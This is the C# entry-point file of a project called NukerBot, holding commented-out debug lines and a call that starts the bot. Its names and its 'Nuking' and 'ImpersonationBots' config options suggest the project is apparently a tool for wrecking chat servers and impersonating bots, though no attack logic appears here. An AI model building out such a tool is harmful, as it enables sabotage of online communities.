using NukerBot.src.Core;
using NukerBot.src.Core.Delegating;
using NukerBot.src.Utils;

namespace NukerBot;

public class Program
{
    public async static Task Main(string[] args)
    {
        //Bot bot = new();
        //await bot.Start();

        // GeneralUtils.GetTotalLines("/home/bran/Documents/Programming/NukerBot/");

        //var deserialized = Config.Deserialize("/home/bran/Documents/Programming/NukerBot/src/Config/Default/config.jsonc");
        //for(int i = 0; i < deserialized.Nuking.Options.ImpersonationBots.Count; i++) {
        //Console.WriteLine($"{i} - {deserialized.Nuking.Options.ImpersonationBots[i]}");
        //var user = await bot.Client.GetUserAsync(deserialized.Nuking.Options.ImpersonationBots[i].ID);
        //}

        await InstanceService.RunAsync(args);

    }
}
